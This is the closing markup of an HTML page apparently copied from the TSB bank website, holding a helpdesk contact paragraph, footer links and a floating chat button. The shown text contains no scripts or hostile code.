                                                                                <a href="http://www.tsb.co.uk/security/malware_pitstop.asp" target="_blank">Malware page</a>. If you still have trouble, please call our helpdesk on&nbsp;0345
                                                                                835 3844&nbsp;(or +44 (0) 203 284 1577from outside the UK), Monday to Friday, 7.00am-10.00pm; Saturday and Sunday, 8.0am - 6.00pm
                                                                            </p>
                                                                            <p></p>
                                                                        </div>
                                                                    </li>
                                                                </ul>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            
											
                                        </div>
                                        <div class="promotionalDefault" style="min-height: 4px;"></div>
                                        <div id="lateral-panel-content-5"></div>
                                        <div id="lateral-panel-content-6"></div>
                                        <div id="lateral-panel-content-7"></div>
                                        <div id="lateral-panel-content-8"></div>
                                        <div id="lateral-panel-content-9"></div>
                                        <div id="lateral-panel-content-10"></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div id="spaHidden" style="display: none;"></div>
            <div id="experienceatfoot" class="col-md-12" style="z-index: 100; margin-bottom: 2px;"></div>

            <div class="footer-tsb">
                <div class="container">
                    <div class="outer">
                        <div class="row">
                            <div class="col-xs-12">
                                <div class="footerInner-tsb">
                                    <ul>
                                        <li>
                                            <a href="http://www.tsb.co.uk/legal/" target="_blank" title="Legal" class="">Legal</a>
                                        </li>
                                        <li>
                                            <a href="http://www.tsb.co.uk/privacy/" target="_blank" title="Privacy" class="">Privacy</a>
                                        </li>
                                        <li>
                                            <a href="http://www.tsb.co.uk/security/" target="_blank" title="Security" class="">Security</a>
                                        </li>
                                        <li>
                                            <a href="https://www.tsb.co.uk/help/rates-and-charges/" target="_blank" title="Rates and Charges" class="">Rates and Charges</a>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div id="cms-backdrop" class="inactive"></div>

        
        <div
            id="LPMcontainer-1599870450176-0"
            class="LPMcontainer LPMoverlay"
            role="button"
            tabindex="0"
            style="
                margin: -131px 1px 1px auto;
                padding: 0px;
                border-style: solid;
                border-width: 0px;
                font-style: normal;
                font-weight: normal;
                font-variant: normal;
                list-style: outside none none;
                letter-spacing: normal;
                line-height: normal;
                text-decoration: none;
                vertical-align: baseline;
                white-space: normal;
                word-spacing: normal;
                background-repeat: repeat-x;
                background-position: left bottom;
                background-color: rgb(255, 255, 255);
                border-radius: 10px;
                width: 47px;
                height: 262px;
                cursor: pointer;
                display: block;
                z-index: 107158;
                position: fixed;
                top: 50%;
                bottom: auto;
                left: auto;
                right: 0px;
            "
        >
            <img
                src="./files/img/chat_floating.png"
                id="LPMimage-1599870450178-1"
                alt=""
                class="LPMimage"
                style="
                    margin: 0px;
                    padding: 0px;
                    border-style: none;
                    border-width: 0px;
                    font-style: normal;
                    font-weight: normal;
                    font-variant: normal;
                    list-style: outside none none;
                    letter-spacing: normal;
                    line-height: normal;
                    text-decoration: none;
                    vertical-align: baseline;
                    white-space: normal;
                    word-spacing: normal;
                    position: absolute;
                    top: -1px;
                    left: -1px;
                    z-index: 600;
                "
            />
        </div>
    </body>
</html>
